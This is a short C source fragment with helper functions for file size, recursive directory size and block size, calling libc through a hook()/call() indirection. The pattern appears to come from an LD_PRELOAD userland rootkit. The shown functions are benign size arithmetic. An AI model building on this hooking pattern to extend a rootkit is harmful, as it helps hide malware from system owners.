u_long getfilesize(const char *path){
    struct stat sbuf;
    hook(C__LXSTAT);
    memset(&sbuf, 0, sizeof(struct stat));
    if((long)call(C__LXSTAT, _STAT_VER, path, &sbuf) < 0 || sbuf.st_size < 0)
        return 0;
    return (u_long)sbuf.st_size;
}
u_long getnewfilesize(const char *path, const u_long fsize){
    return getfilesize(path) + fsize;
}

u_long getdirsize(const char *dirpath){
    hook(COPENDIR, CREADDIR, C__LXSTAT);

    DIR *dp = call(COPENDIR, dirpath);
    if(dp == NULL) return 0;

    u_long ret = 0;
    const size_t dirpathlen = strlen(dirpath);
    struct dirent *dir;
    while((dir = call(CREADDIR, dp)) != NULL){
        if(parent_or_current_dir(dir->d_name))
            continue;

        char path[dirpathlen + strlen(dir->d_name) + 2];
        snprintf(path, sizeof(path), "%s/%s", dirpath, dir->d_name);

        struct stat sbuf;
        memset(&sbuf, 0, sizeof(struct stat));
        if((long)call(C__LXSTAT, _STAT_VER, path, &sbuf) < 0 || sbuf.st_size < 0)
            continue;

        if(S_ISDIR(sbuf.st_mode))
            ret += getdirsize(path);
        else ret += (u_long)sbuf.st_size;
    }
    closedir(dp);
    return ret;
}
u_long getnewdirsize(const char *dirpath, const u_long fsize){
    return getdirsize(dirpath) + fsize;
}

/* returns a blocksize for fsize. if BLOCK_MAX_SIZE is defined & the initial
 * blocksize is larger than that value, count is incremented until the blocksize
 * to be returned is lower than the defined BLOCK_MAX_SIZE. */
u_long getablocksize(const u_long fsize){
    if(fsize == 0)
        return 0;
    int count = BLOCK_COUNT;
    off_t blksize = fsize/count;
#ifdef BLOCK_MAX_SIZE
    while((blksize = fsize/count++) > BLOCK_MAX_SIZE);
#endif
    return blksize;
}